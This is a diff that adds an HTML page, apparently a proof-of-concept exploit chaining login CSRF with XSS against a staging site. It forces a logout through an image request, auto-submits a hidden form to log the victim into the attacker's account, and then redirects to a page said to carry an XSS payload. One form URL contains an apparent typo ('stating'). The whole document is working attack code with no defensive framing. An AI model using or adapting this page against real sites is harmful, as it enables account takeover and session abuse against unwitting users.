@@ -1,0 +1,16 @@
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <!-- Form CSRF to authenticate user into the site  -->
+    <form  target="attacker" action="https://stating.example.com/login_with_csrf">
+        <!-- Form CSRF to authenticate user into the site  -->          
+    </form>
+  </body>
+</html>
+<iframe name="attacker"></iframe>
+<img src="https://staging.example.com/admin/logout"> <!--  URL to logout current session -->
+<script>
+setTimeout(function(){ document.forms[0].submit(); }, 1500); // login attackers account
+setTimeout(function(){ window.location.href='https://staging.example.com/profiles/vulnerable_to_XSS'; }, 4000); // redirect to XSS payload page
+</script>
